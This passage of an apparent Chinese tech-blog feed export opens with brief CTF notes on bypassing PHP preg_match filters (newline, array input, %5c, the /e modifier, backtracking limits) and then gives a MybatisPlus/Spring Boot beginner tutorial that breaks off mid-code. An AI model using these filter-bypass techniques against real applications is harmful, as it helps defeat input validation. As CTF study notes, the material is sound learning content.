    <content><![CDATA[<h2 id="PHP正则绕过总结"><a href="#PHP正则绕过总结" class="headerlink" title="PHP正则绕过总结"></a>PHP正则绕过总结</h2><h3 id="换行符绕过"><a href="#换行符绕过" class="headerlink" title="换行符绕过"></a>换行符绕过</h3><p>原理是preg_match()是单行匹配,添加%0a换行符后对第二行的内容会不做处理</p>
<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>preg_match()只能处理字符串,当传入数组时会返回false,当有时候if(!preg_match())时很好用</p>
<h3 id="5c绕过"><a href="#5c绕过" class="headerlink" title="%5c绕过"></a>%5c绕过</h3><p>\的编码是%5c</p>
<p>当匹配以数字,字母,下划线开头的值的时候,可以使用\绕过</p>
<h3 id="preg-match-“-e”"><a href="#preg-match-“-e”" class="headerlink" title="preg_match(“/^$/e”)"></a>preg_match(“/^$/e”)</h3><p>(注：php版本需要小于5.5.0)</p>
<p>preg_replace 使用了 /e 模式，导致可以代码执行</p>
<h3 id="正则回溯"><a href="#正则回溯" class="headerlink" title="正则回溯"></a>正则回溯</h3><h5 id="正则匹配中贪婪模式和非贪婪模式的区别"><a href="#正则匹配中贪婪模式和非贪婪模式的区别" class="headerlink" title="正则匹配中贪婪模式和非贪婪模式的区别"></a>正则匹配中贪婪模式和非贪婪模式的区别</h5><p>我个人理解为,贪婪模式情况下,会尽可能多的进行每一次的匹配,非贪婪模式每一次进行匹配都会找尽可能短的满足<code>?</code>前条件的字符完成本次匹配</p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在贪婪模式下,php对于后面字符串的匹配次数有着限制,超过这个限制,preg_match就回返回false’</p>
<p>一般通过python脚本实现,</p>
<p>后面补上具体题目的操作过程</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>正则</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>MybatisPlus初步学习</title>
    <url>/2022/02/01/MybatisPlus%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>​     MybatisPlus是一款Mybatis增强工具，用于简化开发，提高效率。  它在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。 <span id="more"></span></p>
<p>​    官网： <a href="https://mp.baomidou.com/">https://mp.baomidou.com/</a> </p>
<h2 id="2-快速入门"><a href="#2-快速入门" class="headerlink" title="2.快速入门"></a>2.快速入门</h2><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `<span class="keyword">user</span>` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">  `user_name` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">  `age` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">  `address` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;地址&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">5</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span>  <span class="keyword">into</span> `<span class="keyword">user</span>`(`id`,`user_name`,`password`,`name`,`age`,`address`) <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">&#x27;ruiwen&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;瑞文&#x27;</span>,<span class="number">12</span>,<span class="string">&#x27;山东&#x27;</span>),(<span class="number">2</span>,<span class="string">&#x27;gailun&#x27;</span>,<span class="string">&#x27;1332&#x27;</span>,<span class="string">&#x27;盖伦&#x27;</span>,<span class="number">13</span>,<span class="string">&#x27;平顶山&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;timu&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;提姆&#x27;</span>,<span class="number">22</span>,<span class="string">&#x27;蘑菇石&#x27;</span>),(<span class="number">4</span>,<span class="string">&#x27;daji&#x27;</span>,<span class="string">&#x27;1222&#x27;</span>,<span class="string">&#x27;妲己&#x27;</span>,<span class="number">221</span>,<span class="string">&#x27;狐山&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h5 id="1-创建SpringBoot工程并添加依赖"><a href="#1-创建SpringBoot工程并添加依赖" class="headerlink" title="1.创建SpringBoot工程并添加依赖"></a>1.创建SpringBoot工程并添加依赖</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springBoot<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--热部署依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="2-创建启动类"><a href="#2-创建启动类" class="headerlink" title="2.创建启动类"></a>2.创建启动类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(HelloApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="3-准备实体类"><a href="#3-准备实体类" class="headerlink" title="3.准备实体类"></a>3.准备实体类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用MybatisPlus"><a href="#使用MybatisPlus" class="headerlink" title="使用MybatisPlus"></a>使用MybatisPlus</h4><h5 id="1添加依赖"><a href="#1添加依赖" class="headerlink" title="1添加依赖"></a>1添加依赖</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>引入<code>mybatis-plus-boot-starter</code>依赖之后,会自动引入SpringBoot开发中所需要的MP所有依赖,不需要再去单独引入了</p>
<h5 id="2配置数据库信息"><a href="#2配置数据库信息" class="headerlink" title="2配置数据库信息"></a>2配置数据库信息</h5><p>resources/application.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/mp_db?characterEncoding=utf-8&amp;serverTimezone=UTC</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br></pre></td></tr></table></figure>

<p>时区设置成ShangHai但是报错了,改成UTC先用吧</p>
<h5 id="3创建Mapper接口"><a href="#3创建Mapper接口" class="headerlink" title="3创建Mapper接口"></a>3创建Mapper接口</h5><p>创建Mapper接口继承BaseMapper接口</p>
<p>mapper/UserMapper.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;</span><br><span class="line"><span class="keyword">import</span> com.blue.domain.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">User</span>&gt;</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>BaseMapper接口中已经提供了很多常用的方法,所以只需要从容器中获取Mapper就可以进行操作了,不需要自己去编写sql语句</p>
<h5 id="4配置Mapper扫描"><a href="#4配置Mapper扫描" class="headerlink" title="4配置Mapper扫描"></a>4配置Mapper扫描</h5><p>每次配置完Mapper都需要添加一个<code>@Mapper</code>注解很麻烦</p>
<p>可以直接在启动类上配置Mapper所在的包,让其直接进行扫描</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.blue.mapper&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(HelloApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="测试注意事项"><a href="#测试注意事项" class="headerlink" title="测试注意事项"></a>测试注意事项</h5><p>还需要在测试类上添加一个注解,否则可能会报空指针异常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们可以根据版本选择@RunWith(SpringJUnit4ClassRunner.class)或者@RunWith(SpringRunner.class)</span><br></pre></td></tr></table></figure>

<p>还需要注意的是test下面的包要和main下面的包名保持一致,不然找不到SpringBootApplication</p>
<h5 id="获取Mapper进行测试"><a href="#获取Mapper进行测试" class="headerlink" title="获取Mapper进行测试"></a>获取Mapper进行测试</h5><p>起初使用@SpringBootTest注解报红,去网上找了解决办法,导入这个依赖就好了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试类的所在位置</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220202000821862.png" alt="image-20220202000821862"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MPTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testQueryList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List&lt;User&gt; users=userMapper.selectList(<span class="keyword">null</span>);</span><br><span class="line">        System.out.println(users);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处使用Autowired自动注入报错了,是因为不允许null值</p>
<p>两种解决办法</p>
<ul>
<li>```java<br>@Autowired(required = false)<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  使用@Resource替换@Autowired</span><br></pre></td></tr></table></figure></li>
</ul>
<p>这里又引出了两种注解的区别,去网上找到了一个比较容易理解的回答</p>
<h5 id="Autowired和-Resource区别"><a href="#Autowired和-Resource区别" class="headerlink" title="@Autowired和@Resource区别"></a>@Autowired和@Resource区别</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span>注解是按类型装配依赖对象，默认情况下它要求依赖对象必须存在，如果允许<span class="keyword">null</span>值，可以设置它required属性为<span class="keyword">false</span>。<span class="meta">@Resource</span>注解和<span class="meta">@Autowired</span>一样，也可以标注在字段或属性的setter方法上，但它默认按名称装配。名称可以通过<span class="meta">@Resource</span>的name属性指定，如果没有指定name属性，当注解标注在字段上，即默认取字段的名称作为bean名称寻找依赖对象，当注解标注在属性的setter方法上，即默认取属性名作为bean名称寻找依赖对象。 <span class="meta">@Resources</span>按名字，是ＪＤＫ的，<span class="meta">@Autowired</span>按类型，是Spring的。</span><br></pre></td></tr></table></figure>



<h2 id="3-常用设置"><a href="#3-常用设置" class="headerlink" title="3.常用设置"></a>3.常用设置</h2><h3 id="3-1-设置表映射规则"><a href="#3-1-设置表映射规则" class="headerlink" title="3.1 设置表映射规则"></a>3.1 设置表映射规则</h3><p>​    默认情况下MP操作的表名就是实体类的类名，但是如果表名和类名不一致就需要我们自己设置映射规则。</p>
<h4 id="3-1-1-单独设置"><a href="#3-1-1-单独设置" class="headerlink" title="3.1.1 单独设置"></a>3.1.1 单独设置</h4><p>​    可以在实体类的类名上加上@TableName注解进行标识。</p>
<p>例如：</p>
<p>​    如果表名是tb_user，而实体类名是User则可以使用以下写法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@TableName(&quot;tb_user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-1-2-全局设置表名前缀"><a href="#3-1-2-全局设置表名前缀" class="headerlink" title="3.1.2 全局设置表名前缀"></a>3.1.2 全局设置表名前缀</h4><p>​    一般一个项目表名的前缀都是统一风格的，这个时候如果一个个设置就太麻烦了。我们可以通过配置来设置全局的表名前缀。</p>
<p>例如：</p>
<p>​    如果一个项目中所有的表名相比于类名都是多了个前缀： <code>tb_</code> 。这可以使用如下方式配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="comment">#表名前缀</span></span><br><span class="line">      <span class="attr">table-prefix:</span> <span class="string">tb_</span></span><br></pre></td></tr></table></figure>

<h3 id="3-2-设置主键生成策略"><a href="#3-2-设置主键生成策略" class="headerlink" title="3.2 设置主键生成策略"></a>3.2 设置主键生成策略</h3><h4 id="3-2-0-测试代码"><a href="#3-2-0-测试代码" class="headerlink" title="3.2.0 测试代码"></a>3.2.0 测试代码</h4><h5 id=""><a href="#" class="headerlink" title=""></a></h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testInsert</span><span class="params">()</span></span>&#123;</span><br><span class="line">    User user = <span class="keyword">new</span> User();</span><br><span class="line">    user.setUserName(<span class="string">&quot;lisi&quot;</span>);</span><br><span class="line">    user.setPassword(<span class="string">&quot;7777&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> r = userMapper.insert(user);</span><br><span class="line">    System.out.println(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-1-单独设置"><a href="#3-2-1-单独设置" class="headerlink" title="3.2.1 单独设置"></a>3.2.1 单独设置</h4><p>​    默认情况下使用MP插入数据时，如果在我们没有设置主键生成策略的情况下默认的策略是基于雪花算法的自增id。<strong>雪花算法生成的id数字特别长,但是能保证唯一性</strong></p>
<p>​    如果我们需要使用别的策略可以在定义实体类时，在代表主键的字段上加上<code>@TableId</code>注解，使用其<code>type</code>属性指定主键生成策略。</p>
<p>例如：</p>
<p>​    我们要设置主键自动增长则可以设置如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@TableId(type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>全部主键策略定义在了枚举类<code>IdType</code>中，<code>IdType</code>有如下的取值</p>
<ul>
<li><p><code>AUTO</code></p>
<p>数据库ID自增，<strong>依赖于数据库</strong>。该类型请确保数据库设置了 ID自增 否则无</p>
</li>
<li><p><code>NONE</code></p>
<p>未设置主键类型。若在代码中没有手动设置主键，则会根据<strong>主键的全局策略</strong>自动生成（默认的主键全局策略是基于雪花算法的自增ID）</p>
</li>
<li><p><code>INPUT</code></p>
<p>需要手动设置主键，若不设置。插入操作生成SQL语句时，主键这一列的值会是<code>null</code>。</p>
</li>
<li><p><code>ASSIGN_ID</code></p>
<p>当没有手动设置主键，即实体类中的主键属性为空时，才会自动填充，使用雪花算法</p>
</li>
<li><p><code>ASSIGN_UUID</code></p>
<p>当实体类的主键属性为空时，才会自动填充，使用UUID</p>
</li>
</ul>
<h4 id="3-2-2-全局设置"><a href="#3-2-2-全局设置" class="headerlink" title="3.2.2 全局设置"></a>3.2.2 全局设置</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="comment"># id生成策略 auto为数据库自增</span></span><br><span class="line">      <span class="attr">id-type:</span> <span class="string">auto</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3-设置字段映射关系"><a href="#3-3-设置字段映射关系" class="headerlink" title="3.3 设置字段映射关系"></a>3.3 设置字段映射关系</h3><p>​    默认情况下MP会根据实体类的属性名去映射表的列名。</p>
<p>​    如果数据库的列表和实体类的属性名不一致了我们可以使用<code>@TableField</code>注解的<code>value</code>属性去设置映射关系。</p>
<p>​    </p>
<p>例如：</p>
<p>​    如果表中一个列名叫 address而 实体类中的属性名为addressStr则可以使用如下方式进行配置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@TableField(&quot;address&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String addressStr;</span><br></pre></td></tr></table></figure>

<h3 id="3-4-设置字段和列名的驼峰映射"><a href="#3-4-设置字段和列名的驼峰映射" class="headerlink" title="3.4 设置字段和列名的驼峰映射"></a>3.4 设置字段和列名的驼峰映射</h3><p>​    默认情况下MP会开启字段名列名的驼峰映射， 即从经典数据库列名 A_COLUMN（下划线命名） 到经典 Java 属性名 aColumn（驼峰命名） 的类似映射 。</p>
<p>​    如果需要关闭我们可以使用如下配置进行关闭。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">	<span class="comment">#是否开启自动驼峰命名规则（camel case）映射，即从经典数据库列名 A_COLUMN（下划线命名） 到经典 Java 属性名 aColumn（驼峰命名） 的类似映射</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="3-5-日志"><a href="#3-5-日志" class="headerlink" title="3.5 日志"></a>3.5 日志</h3><p>​    如果需要打印MP操作对应的SQL语句等，可以配置日志输出。</p>
<p>配置方式如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="comment"># 日志</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br></pre></td></tr></table></figure>

<h2 id="4-基本使用"><a href="#4-基本使用" class="headerlink" title="4.基本使用"></a>4.基本使用</h2><h3 id="4-1-插入数据"><a href="#4-1-插入数据" class="headerlink" title="4.1 插入数据"></a>4.1 插入数据</h3><p>​    我们可以使用insert方法来实现数据的插入。</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testInsert</span><span class="params">()</span></span>&#123;</span><br><span class="line">    User user = <span class="keyword">new</span> User();</span><br><span class="line">    user.setUserName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">    user.setPassword(<span class="string">&quot;7777888&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> r = userMapper.insert(user);</span><br><span class="line">    System.out.println(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-删除操作"><a href="#4-2-删除操作" class="headerlink" title="4.2 删除操作"></a>4.2 删除操作</h3><p>​    我们可以使用<strong>deleteXXX</strong>方法来实现数据的删除。</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDelete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List&lt;Integer&gt; ids = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    ids.add(<span class="number">5</span>);</span><br><span class="line">    ids.add(<span class="number">6</span>);</span><br><span class="line">    ids.add(<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">int</span> i = userMapper.deleteBatchIds(ids);<span class="comment">//该方法使用id的list来批量根据id来删除</span></span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDeleteById</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = userMapper.deleteById(<span class="number">8</span>);<span 